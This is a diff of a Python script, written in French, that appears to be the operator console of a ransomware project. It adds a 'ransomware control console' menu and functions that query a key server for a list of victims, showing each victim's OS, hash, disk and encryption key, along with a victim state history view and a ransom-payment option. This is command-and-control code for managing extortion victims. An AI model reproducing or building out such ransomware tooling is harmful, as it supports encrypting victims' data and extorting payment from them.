@@ -4,7 +4,7 @@ import utile.network as network
 import utile.message as message
 '''import utile.security as security
 import utile.config as config
-#import utile.input as my_input'''
+import utile.input as my_input'''
 
 
 # Constantes
@@ -15,6 +15,7 @@ PORT_SERV_CONSOLE = 8381
 def affichage_menu():
     print("")
     print("============================================================================")
+    print("CONSOLE DE CONTROLE DU RANSOMWARE")
     print("============================================================================")
     print("1) Liste de victimes du ransomware")
     print("2) Historiques des états d'une victime")
@@ -25,37 +26,41 @@ def affichage_menu():
 def affichage_liste_victimes():
 
     print("")
-    print("")
+    print("============================================================================")
     print("LISTING DES VICTIMES DU RANSOMWARE")
-    print("____________________________________________________________________________")
+    print("============================================================================")
     # Envoi de la requête
     s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
     msg = message.set_message("LIST_VICTIM_REQ")
     network.send_message(s, msg)
     response = network.receive_message(s)
-    print(response)
-    # Réception de la réponse
-    msg = network.receive_message(s)
-    if msg is None:
-        print("Aucun message reçu.")
+    if response is None:
+        print("Aucune réponse reçue.")
         return
-    print(f"Message reçu: {msg}")
-    print(f"Message de type: {message.get_message_type(msg)}")
-    # Extraction des données
-    data = message.get_message_data(msg)
-    print(f"Data: {data}")
-    # Affichage des données
-    for victime in data:
-        print(f"{victime['id']:<4}{victime['hash']:<12}{victime['type']:<12}{victime['disques']:<12}{victime['statut']:<10}{victime['nb_fichiers']}")
+    #affiche les données
+    data = response['victims']
+    for victim in data:
+        print(f"Victime : {victim[0]} | os: {victim[1]} | hash : {victim[2]} | disk : {victim[3]} | key : {victim[4]} ")
+
 
 
 
 def affichage_historique_etat_victimes():
     print("")
-    print("")
+    print("============================================================================")
     print("HISTORIQUE DES ETATS D'UNE VICTIME")
-    print("__________________________________")
-    choix_victime = input("Entrez le numéro de la victime : ")
+    print("============================================================================")
+    s = network.connect_to_serv(network.LOCAL_IP, network.PORT_SERV_CLES, retry=10)
+    msg = message.set_message("LIST_VICTIM_REQ")
+    network.send_message(s, msg)
+    response = network.receive_message(s)
+    if response is None:
+        print("Aucune réponse reçue.")
+        return
+    # affiche les données
+    data = response
+    print(data)
+
 
 def affichage_payement_rancon():
     print("")
